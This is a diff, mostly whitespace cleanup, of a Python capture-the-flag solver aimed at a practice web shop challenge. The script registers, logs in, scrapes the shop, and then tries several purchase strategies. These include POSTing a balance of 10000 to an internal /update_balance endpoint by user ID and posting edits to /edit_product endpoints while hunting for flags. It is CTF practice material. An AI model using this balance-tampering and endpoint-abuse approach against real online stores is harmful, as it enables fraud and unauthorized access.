@@ -14,16 +14,16 @@ from html.parser import HTMLParser
 
 class FormParser(HTMLParser):
     """HTML parser to extract form data and action URLs"""
-    
+
     def __init__(self):
         super().__init__()
         self.forms = []
         self.current_form = None
         self.in_form = False
-        
+
     def handle_starttag(self, tag, attrs):
         attrs_dict = dict(attrs)
-        
+
         if tag == 'form':
             self.in_form = True
             self.current_form = {
@@ -47,7 +47,7 @@ class FormParser(HTMLParser):
                     'value': attrs_dict.get('value', 'Submit')
                 }
                 self.current_form['inputs'].append(button_data)
-    
+
     def handle_endtag(self, tag):
         if tag == 'form' and self.in_form:
             self.forms.append(self.current_form)
@@ -57,7 +57,7 @@ class FormParser(HTMLParser):
 
 class CTFSolver:
     """Main CTF solver class"""
-    
+
     def __init__(self, base_url):
         self.base_url = base_url.rstrip('/')
         self.cookie_jar = http.cookiejar.CookieJar()
@@ -66,7 +66,7 @@ class CTFSolver:
             urllib.request.HTTPRedirectHandler()
         )
         urllib.request.install_opener(self.opener)
-        
+
     def make_request(self, url, data=None, method='GET'):
         """Make HTTP request with proper error handling"""
         try:
@@ -75,21 +75,21 @@ class CTFSolver:
                     data = urllib.parse.urlencode(data).encode('utf-8')
                 elif isinstance(data, str):
                     data = data.encode('utf-8')
-                    
+
             req = urllib.request.Request(url, data=data)
             req.add_header('User-Agent', 'Mozilla/5.0 (CTF Solver)')
             req.add_header('Content-Type', 'application/x-www-form-urlencoded')
-            
+
             response = urllib.request.urlopen(req)
             content = response.read().decode('utf-8', errors='ignore')
-            
+
             return {
                 'status': response.getcode(),
                 'headers': dict(response.headers),
                 'content': content,
                 'url': response.geturl()
             }
-            
+
         except urllib.error.HTTPError as e:
             error_content = e.read().decode('utf-8', errors='ignore')
             return {
@@ -107,18 +107,18 @@ class CTFSolver:
                 'url': url,
                 'error': str(e)
             }
-    
+
     def parse_forms(self, html_content):
         """Parse HTML to extract form information"""
         parser = FormParser()
         parser.feed(html_content)
         return parser.forms
-    
+
     def find_flag(self, text):
         """Search for flag patterns in text with comprehensive detection"""
         if not text:
             return None
-            
+
         # Standard flag patterns
         flag_patterns = [
             r'flag\{[^}]+\}',
@@ -131,12 +131,12 @@ class CTFSolver:
             r'flag_[a-zA-Z0-9_]+',      # Flag with underscore
             r'FLAG_[a-zA-Z0-9_]+',      # FLAG with underscore
         ]
-        
+
         for pattern in flag_patterns:
             matches = re.findall(pattern, text, re.IGNORECASE)
             if matches:
                 return matches[0] if isinstance(matches, list) else matches
-        
+
         # Look for hidden text in HTML comments
         comment_pattern = r'<!--\s*([^-]+)\s*-->'
         comments = re.findall(comment_pattern, text, re.DOTALL)
@@ -145,7 +145,7 @@ class CTFSolver:
                 matches = re.findall(pattern, comment, re.IGNORECASE)
                 if matches:
                     return matches[0] if isinstance(matches, list) else matches
-        
+
         # Look for flag in JavaScript variables
         js_patterns = [
             r'var\s+flag\s*=\s*["\']([^"\']+)["\']',
@@ -153,18 +153,18 @@ class CTFSolver:
             r'let\s+flag\s*=\s*["\']([^"\']+)["\']',
             r'flag\s*:\s*["\']([^"\']+)["\']',
         ]
-        
+
         for pattern in js_patterns:
             matches = re.findall(pattern, text, re.IGNORECASE)
             if matches:
                 return matches[0]
-        
+
         # Look for flag in data attributes
         data_pattern = r'data-flag\s*=\s*["\']([^"\']+)["\']'
         matches = re.findall(data_pattern, text, re.IGNORECASE)
         if matches:
             return matches[0]
-        
+
         # Look for suspicious strings that might be flags
         suspicious_patterns = [
             r'[A-Za-z0-9+/]{20,}={0,2}',  # Base64 encoded
@@ -172,7 +172,7 @@ class CTFSolver:
             r'[0-9a-f]{40}',              # SHA1 hash
             r'[0-9a-f]{64}',              # SHA256 hash
         ]
-        
+
         for pattern in suspicious_patterns:
             matches = re.findall(pattern, text)
             if matches:
@@ -180,24 +180,24 @@ class CTFSolver:
                 for match in matches:
                     if len(match) >= 20 and not match.startswith('http') and 'bootstrap' not in match.lower():
                         return match
-        
+
         return None
-    
+
     def register(self, username='testuser', password='testpass'):
         """Register a new account"""
         print(f"[+] Registering account: {username}")
-        
+
         register_url = f"{self.base_url}/register"
         data = {
             'username': username,
             'password': password
         }
-        
+
         response = self.make_request(register_url, data, 'POST')
-        
+
         print(f"[+] Registration response status: {response['status']}")
         print(f"[+] Registration response URL: {response['url']}")
-        
+
         # Check for success indicators
         if 'success' in response['content'].lower() or response['status'] == 200:
             print("[+] Registration appears successful")
@@ -209,23 +209,23 @@ class CTFSolver:
             print(f"[-] Registration may have failed: {response.get('error', 'Unknown error')}")
             print(f"[+] Response content preview: {response['content'][:200]}...")
             return False
-    
+
     def login(self, username='testuser', password='testpass'):
         """Login with credentials"""
         print(f"[+] Logging in with: {username}")
-        
+
         login_url = f"{self.base_url}/login"
         data = {
             'username': username,
             'password': password
         }
-        
+
         response = self.make_request(login_url, data, 'POST')
-        
+
         print(f"[+] Login response status: {response['status']}")
         print(f"[+] Login response URL: {response['url']}")
         print(f"[+] Cookies after login: {len(self.cookie_jar)}")
-        
+
         # Check if redirected to shop or dashboard
         if '/shop' in response['url'] or 'shop' in response['content'].lower():
             print("[+] Login successful - redirected to shop")
@@ -236,53 +236,53 @@ class CTFSolver:
         else:
             print(f"[-] Login may have failed: {response.get('error', 'Unknown error')}")
             return False
-    
+
     def access_shop(self):
         """Access the shop page"""
         print("[+] Accessing shop...")
-        
+
         shop_url = f"{self.base_url}/shop"
         response = self.make_request(shop_url)
-        
+
         print(f"[+] Shop response status: {response['status']}")
         print(f"[+] Shop response URL: {response['url']}")
-        
+
         if response['status'] == 200:
             print("[+] Successfully accessed shop")
-            
+
             # Print shop content for analysis
             print(f"[+] Shop content length: {len(response['content'])}")
-            
+
             # Look for flag in shop page
             flag = self.find_flag(response['content'])
             if flag:
                 print(f"[!] FLAG FOUND IN SHOP PAGE: {flag}")
                 return response, flag
-            
+
             # Analyze shop content for products and purchase mechanisms
             self.analyze_shop_content(response['content'])
-            
+
             # Parse forms for purchase options
             forms = self.parse_forms(response['content'])
             print(f"[+] Found {len(forms)} forms in shop")
-            
+
             for i, form in enumerate(forms):
                 print(f"[+] Form {i+1}: {form['method']} {form['action']}")
                 for inp in form['inputs']:
                     print(f"    Input: {inp}")
-            
+
             return response, None
         else:
             print(f"[-] Failed to access shop: {response.get('error', 'Unknown error')}")
             return response, None
-    
+
     def analyze_shop_content(self, content):
         """Analyze shop content for products and purchase mechanisms"""
         print("[+] Analyzing shop content...")
-        
+
         # Look for product information
         products = []
-        
+
         # Search for product patterns in JavaScript
         js_product_pattern = r'// ID: (\d+), Name: ([^\\n]+)'
         js_matches = re.findall(js_product_pattern, content)
@@ -291,7 +291,7 @@ class CTFSolver:
             for product_id, product_name in js_matches:
                 products.append({'id': product_id, 'name': product_name})
                 print(f"    Product {product_id}: {product_name}")
-        
+
         # Look for HTML product elements
         html_patterns = [
             r'<div[^>]*class="[^"]*product[^"]*"[^>]*>(.*?)</div>',
@@ -299,7 +299,7 @@ class CTFSolver:
             r'<h[1-6][^>]*>([^<]*(?:laptop|phone|headphone|watch|product)'
             r'[^<]*)</h[1-6]>',
         ]
-        
+
         for pattern in html_patterns:
             matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
             if matches:
@@ -309,7 +309,7 @@ class CTFSolver:
                         print(f"    HTML: {match[0][:100]}...")
                     else:
                         print(f"    HTML: {match[:100]}...")
-        
+
         # Look for purchase mechanisms
         purchase_patterns = [
             r'<button[^>]*(?:buy|purchase|order|cart)[^>]*>(.*?)</button>',
@@ -319,20 +319,20 @@ class CTFSolver:
             r'onclick="[^"]*(?:buy|purchase|order|cart)[^"]*"',
             r'function\s+(?:buy|purchase|order|cart)\s*\(',
         ]
-        
+
         purchase_elements = []
         for pattern in purchase_patterns:
             matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
             if matches:
                 purchase_elements.extend(matches)
-        
+
         if purchase_elements:
             print(f"[+] Found {len(purchase_elements)} purchase-related elements:")
             for element in purchase_elements[:10]:  # Show first 10
                 print(f"    Purchase element: {str(element)[:100]}...")
         else:
             print("[-] No obvious purchase elements found")
-        
+
         # Look for JavaScript functions and AJAX calls
         js_function_patterns = [
             r'function\s+(\w*(?:buy|purchase|order|cart)\w*)\s*\([^)]*\)',
@@ -342,74 +342,74 @@ class CTFSolver:
             r'\.get\s*\(\s*["\']([^"\']*(?:buy|purchase|order|cart)'
             r'[^"\']*)["\']',
         ]
-        
+
         js_functions = []
         for pattern in js_function_patterns:
             matches = re.findall(pattern, content, re.IGNORECASE)
             if matches:
                 js_functions.extend(matches)
-        
+
         if js_functions:
             print(f"[+] Found {len(js_functions)} JavaScript purchase functions/endpoints:")
             for func in js_functions:
                 print(f"    JS function/endpoint: {func}")
-        
+
         # Look for hidden elements or data attributes
         hidden_patterns = [
             r'data-product-id="([^"]+)"',
             r'data-price="([^"]+)"',
             r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]+)"',
         ]
-        
+
         hidden_data = []
         for pattern in hidden_patterns:
             matches = re.findall(pattern, content, re.IGNORECASE)
             if matches:
                 hidden_data.extend(matches)
-        
+
         if hidden_data:
             print(f"[+] Found {len(hidden_data)} hidden data elements:")
             for data in hidden_data[:10]:  # Show first 10
                 print(f"    Hidden data: {data}")
-        
+
         return {
             'products': products,
             'purchase_elements': purchase_elements,
             'js_functions': js_functions,
             'hidden_data': hidden_data
         }
-    
+
     def make_purchase(self, shop_response):
         """Attempt to make a purchase using multiple strategies"""
         print("[+] Looking for purchase functionality...")
-        
+
         # Extract user ID from profile link (discovered in shop analysis)
         user_id_match = re.search(r'/profile/(\d+)', shop_response['content'])
         user_id = user_id_match.group(1) if user_id_match else '2'  # Default to 2 based on analysis
         print(f"[+] Detected user ID: {user_id}")
-        
+
         # Strategy 1: Try to update balance using internal endpoint
         print("[+] Strategy 1: Attempting to update balance using internal endpoint...")
         balance_url = f"{self.base_url}/update_balance/{user_id}"
         balance_data = {'balance': '10000'}  # Set high balance to afford any item
-        
+
         balance_response = self.make_request(balance_url, balance_data, 'POST')
         if balance_response and balance_response['status'] == 200:
             print("[+] Balance update successful!")
-            
+
             # Check for flag in balance update response
             flag = self.find_flag(balance_response['content'])
             if flag:
                 print(f"[!] FLAG FOUND AFTER BALANCE UPDATE: {flag}")
                 return flag
-            
+
             # Now try to purchase the cheapest item (Headphones - $199.99, product ID 3)
             print("[+] Attempting to add cheapest item to cart...")
             cart_response = self.make_request(f"{self.base_url}/add_to_cart/3")  # Headphones
-            
+
             if cart_response and cart_response['status'] == 200:
                 print("[+] Item added to cart successfully!")
-                
+
                 # Check for flag in cart response
                 flag = self.find_flag(cart_response['content'])
                 if flag:
@@ -417,15 +417,15 @@ class CTFSolver:
                     return flag
         else:
             print("[-] Balance update failed or not allowed")
-        
+
         # Strategy 2: Try direct purchase with "Add to Cart" links
         print("[+] Strategy 2: Trying direct 'Add to Cart' approaches...")
-        
+
         # Try adding each product to cart (discovered products 1-4)
         for product_id in range(1, 5):
             print(f"[+] Trying to add product {product_id} to cart...")
             cart_response = self.make_request(f"{self.base_url}/add_to_cart/{product_id}")
-            
+
             if cart_response and cart_response['status'] == 200:
                 print(f"[+] Product {product_id} added to cart!")
                 flag = self.find_flag(cart_response['content'])
@@ -434,24 +434,24 @@ class CTFSolver:
                     return flag
             else:
                 print(f"[-] Failed to add product {product_id} to cart")
-        
+
         # Strategy 3: Try to access cart and complete purchase
         print("[+] Strategy 3: Accessing cart to complete purchase...")
         cart_page_response = self.make_request(f"{self.base_url}/cart")
-        
+
         if cart_page_response and cart_page_response['status'] == 200:
             print("[+] Cart page accessed successfully!")
             flag = self.find_flag(cart_page_response['content'])
             if flag:
                 print(f"[!] FLAG FOUND IN CART PAGE: {flag}")
                 return flag
-            
+
             # Look for checkout/purchase forms in cart
             cart_forms = self.parse_forms(cart_page_response['content'])
             for form in cart_forms:
                 if any(keyword in form['action'].lower() for keyword in ['checkout', 'purchase', 'buy', 'order']):
                     print(f"[+] Found checkout form: {form['action']}")
-                    
+
                     # Prepare form data
                     form_data = {}
                     for inp in form['inputs']:
@@ -459,19 +459,19 @@ class CTFSolver:
                             form_data[inp['name']] = inp['value']
                         elif inp['type'] != 'submit':
                             form_data[inp['name']] = inp.get('value', '')
-                    
+
                     # Submit checkout form
                     checkout_url = form['action']
                     if not checkout_url.startswith('http'):
                         checkout_url = f"{self.base_url}{checkout_url}"
-                    
+
                     checkout_response = self.make_request(checkout_url, form_data, form['method'])
                     if checkout_response and checkout_response['status'] == 200:
                         flag = self.find_flag(checkout_response['content'])
                         if flag:
                             print(f"[!] FLAG FOUND AFTER CHECKOUT: {flag}")
                             return flag
-        
+
         # Strategy 4: Try common purchase endpoints
         print("[+] Strategy 4: Trying common purchase endpoints...")
         purchase_endpoints = ['/buy', '/purchase', '/order', '/checkout', '/cart/checkout']
@@ -483,39 +483,39 @@ class CTFSolver:
                 if flag:
                     print(f"[!] FLAG FOUND AT {endpoint}: {flag}")
                     return flag
-        
+
         # Strategy 5: Try the internal product edit endpoint (might trigger something)
         print("[+] Strategy 5: Trying internal product edit endpoint...")
         for product_id in range(1, 5):
             edit_url = f"{self.base_url}/edit_product/{product_id}"
             edit_data = {'description': 'flag_trigger'}
-            
+
             edit_response = self.make_request(edit_url, edit_data, 'POST')
             if edit_response and edit_response['status'] == 200:
                 flag = self.find_flag(edit_response['content'])
                 if flag:
                     print(f"[!] FLAG FOUND AFTER EDITING PRODUCT {product_id}: {flag}")
                     return flag
-        
+
         # Strategy 6: Look for purchase forms in shop page
         print("[+] Strategy 6: Looking for purchase forms in shop page...")
         forms = self.parse_forms(shop_response['content'])
-        
+
         # Look for buy/purchase forms
         purchase_forms = []
         for form in forms:
             form_html = str(form).lower()
             if any(keyword in form_html for keyword in ['buy', 'purchase', 'order', 'cart']):
                 purchase_forms.append(form)
-        
+
         if not purchase_forms:
             # Try any POST forms as potential purchase forms
             purchase_forms = [f for f in forms if f['method'] == 'POST']
-        
+
         # Try each purchase form
         for i, form in enumerate(purchase_forms):
             print(f"[+] Trying purchase form {i+1}")
-            
+
             # Build form data
             form_data = {}
             for inp in form['inputs']:
@@ -524,7 +524,7 @@ class CTFSolver:
                 elif inp['type'] == 'submit':
                     if inp['name']:
                         form_data[inp['name']] = inp['value']
-            
+
             # Determine action URL
             action = form['action']
             if action.startswith('/'):
@@ -533,75 +533,75 @@ class CTFSolver:
                 purchase_url = action
             else:
                 purchase_url = f"{self.base_url}/shop/{action}" if action else f"{self.base_url}/shop"
-            
+
             print(f"[+] Submitting to: {purchase_url}")
             print(f"[+] Form data: {form_data}")
-            
+
             response = self.make_request(purchase_url, form_data, 'POST')
-            
+
             print(f"[+] Purchase response status: {response['status']}")
             print(f"[+] Purchase response URL: {response['url']}")
-            
+
             # Look for flag in response
             flag = self.find_flag(response['content'])
             if flag:
                 print(f"[!] FLAG FOUND: {flag}")
                 return flag
-            
+
             # Check headers for flag
             headers_text = str(response['headers'])
             flag = self.find_flag(headers_text)
             if flag:
                 print(f"[!] FLAG FOUND IN HEADERS: {flag}")
                 return flag
-            
+
             print(f"[+] Response preview: {response['content'][:300]}...")
-        
+
         return None
-    
+
     def solve(self):
         """Main solving function"""
         print(f"[+] Starting CTF solver for: {self.base_url}")
         print(f"[+] Hint: 'You are alone in the shop just buy'")
         print()
-        
+
         # Step 1: Register
         if not self.register():
             print("[-] Registration failed, but continuing...")
-        
+
         print()
-        
+
         # Step 2: Login
         if not self.login():
             print("[-] Login failed, exiting...")
             return None
-        
+
         print()
-        
+
         # Step 3: Access shop
         shop_response, flag = self.access_shop()
         if flag:
             return flag
-        
+
         if not shop_response or shop_response['status'] != 200:
             print("[-] Could not access shop, exiting...")
             return None
-        
+
         print()
-        
+
         # Step 4: Make purchase
         flag = self.make_purchase(shop_response)
-        
+
         return flag
 
 
 def main():
     """Main function"""
     base_url = "http://u2lsx1lvvxnfzg-0.playat.flagyard.com"
-    
+
     solver = CTFSolver(base_url)
     flag = solver.solve()
-    
+
     if flag:
         print()
         print("=" * 50)
